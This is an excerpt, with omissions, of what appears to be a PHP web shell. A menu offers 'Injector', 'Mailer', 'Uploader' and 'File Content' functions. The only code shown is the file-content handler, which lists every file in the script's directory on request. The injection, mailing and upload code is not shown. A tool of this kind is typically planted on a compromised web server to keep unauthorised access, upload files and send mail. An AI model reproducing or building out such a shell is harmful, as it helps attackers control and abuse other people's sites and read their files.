...
<!--Menu-->
<br><font><center>|<a href="?injector">Injector</a>|<a href="?mailer">Mailer</a>|<a href="?uploader">Uploader</a>|<a href="?media">File Content</a>|</center></font><br>
<!--//End Menu-->
...
<!--//File Content-->
    <?php
    if (isset($_GET['media'])) {
    echo "<font color='red'>File Content</font><br>=========<br>";
    $files = array_diff(scandir(__DIR__), array('..', '.'));
    foreach ($files as $file) {
        echo "<font color='white'>",$file,"<br>";}}?></div>
<!--//End File Content-->
